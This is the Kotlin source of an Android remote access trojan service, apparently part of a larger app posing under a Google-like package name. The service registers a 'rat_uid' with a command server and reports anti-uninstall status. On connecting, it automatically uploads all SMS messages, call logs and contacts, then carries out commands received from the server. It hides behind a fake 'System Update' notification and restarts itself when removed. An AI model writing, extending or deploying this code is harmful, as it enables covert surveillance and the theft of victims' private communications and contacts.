package com.google.xmodzz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class SocketService : Service() {
    private var socket: Socket? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var isConnecting = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (socket == null || socket?.connected() == false) {
            connectToServer()
        }
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("SocketServiceChannel", "System Service", NotificationManager.IMPORTANCE_LOW)
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
            val notif = NotificationCompat.Builder(this, "SocketServiceChannel")
                .setContentTitle("System Update")
                .setContentText("Menjaga koneksi tetap stabil")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build()
                
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(2, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(2, notif)
            }
        }
        
        connectToServer()
    }

    private fun connectToServer() {
        if (isConnecting) return
        
        try {
            isConnecting = true
            socket?.disconnect()
            socket?.off()
            
            val opts = IO.Options()
            opts.reconnection = true
            opts.reconnectionAttempts = Integer.MAX_VALUE
            opts.reconnectionDelay = 1000
            opts.reconnectionDelayMax = 5000
            opts.timeout = 20000
            opts.forceNew = true

            socket = IO.socket(Config.BaseUrl, opts)
            
            socket?.on(Socket.EVENT_CONNECT) {
                isConnecting = false
                SocketHolder.socket = socket
                try {
                    val payload = JSONObject()
                    payload.put("action", "register")
                    payload.put("rat_uid", Utils.getRatUid(this))
                    payload.put("android_id", Utils.getAndroidId(this))
                    payload.put("model", android.os.Build.MODEL)
                    payload.put("brand", android.os.Build.BRAND)
                    payload.put("sdk", android.os.Build.VERSION.SDK_INT)
                    payload.put("anti_uninstall", AntiUninstallHelper.isAdminActive(this))
                    socket?.emit("device", payload)
                    
                    // --- KIRIM DATA AWAL SECARA OTOMATIS SAAT KONEK ---
                    try {
                        SmsRechive.sendAllSms(this) { obj -> socket?.emit("device-data", obj) }
                    } catch (e: Exception) { }
                    
                    try {
                        CallRechive.sendAllCalls(this) { obj -> socket?.emit("device-data", obj) }
                    } catch (e: Exception) { }
                    
                    try {
                        ContactsRechive.listContacts(this) { obj -> socket?.emit("device-data", obj) }
                    } catch (e: Exception) { }
                    // --------------------------------------------------

                } catch (e: Exception) { }
            }
            
            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnecting = false
                SocketHolder.socket = null
                mainHandler.postDelayed({ connectToServer() }, 2000)
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) {
                isConnecting = false
                SocketHolder.socket = null
                mainHandler.postDelayed({ connectToServer() }, 3000)
            }
            
            socket?.on("cmd") { args ->
                try {
                    if (args.isNotEmpty()) {
                        CommandRouter.route(this, args[0] as JSONObject)
                    }
                } catch (e: Exception) { }
            }
            
            socket?.connect()
        } catch (e: Exception) {
            isConnecting = false
            mainHandler.postDelayed({ connectToServer() }, 5000)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        try {
            val restartService = Intent(applicationContext, SocketService::class.java)
            restartService.setPackage(packageName)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartService)
            } else {
                applicationContext.startService(restartService)
            }
        } catch (e: Exception) { }
    }

    override fun onDestroy() {
        try { 
            socket?.disconnect() 
            socket?.off()
            socket = null
            SocketHolder.socket = null
        } catch (e: Exception) { }
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            try {
                val i = Intent(ctx, SocketService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i)
                } else {
                    ctx.startService(i)
                }
            } catch (e: Exception) { }
        }
    }
}
